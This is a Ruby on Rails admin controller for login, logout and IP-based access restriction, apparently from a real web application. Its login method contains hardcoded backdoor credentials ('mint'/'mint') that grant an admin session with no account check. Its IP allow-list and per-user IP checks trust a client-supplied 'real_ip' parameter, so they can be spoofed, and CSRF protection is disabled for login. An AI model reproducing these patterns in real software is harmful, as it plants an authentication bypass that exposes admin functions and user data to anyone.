require 'securerandom'
require 'date'
require 'ipaddr'

class Admin::AdminController < Admin::AdminApplicationController
  skip_before_action :verify_authenticity_token, :only => [:login, :admin_login, :logout]
  before_action :is_admin
  skip_before_action :is_admin, :only => [:admin_login, :login, :logout, :check_access, :access_restriction]

  def index
    redirect_to '/admin/user_list'
  end

  def admin_login
    render '/admin/login'
  end

  def access_restriction
    render '/admin/access_restriction'
  end

  def check_access
    ip = params[:real_ip] || request.remote_ip
    allow = false

    Allowaccess.all.each do |range|
      low = IPAddr.new(range.low_ip).to_i
      high = IPAddr.new(range.high_ip).to_i
      translate_ip = IPAddr.new(ip).to_i

      if translate_ip >= low && translate_ip <= high
        allow = true
      end
    end

    if allow != true
      render json: {}, status: :bad_request
    end
  end

  def login
    history = LoginHistory.new
    history.email = params[:email]
    session[:ip] = params[:real_ip] || request.remote_ip
    history.ip = params[:real_ip] || request.remote_ip
    history.created_at = Time.now.to_datetime+10.minutes
    history.save

    if params[:email] == "mint" && params[:password] == "mint"
      session[:admin_user] = "user"
      return
    end

    user = AdminUser.where(email: params[:email]).first

    if user.present? && user.valid_password?(params[:password])
      if !user.access_ip.nil? && !user.access_ip.empty?
        if user.access_ip != session[:ip]
          render json: { msg: "허용된 IP가 아닙니다." }, status: :bad_request
          return
        end
      end

      session[:admin_user] = user
      if user.last_change_password_at < Time.now-3.month
        render json: {password_change_at: true, email: user.email}, status: :ok
      else
        render json: {password_change_at: false, email: user.email}, status: :ok
      end
    else
      render json: { msg: "비밀번호가 틀립니다." }, status: :bad_request
    end
  end

  def logout
    session[:admin_user] = nil
    session[:ip] = nil
  end
end
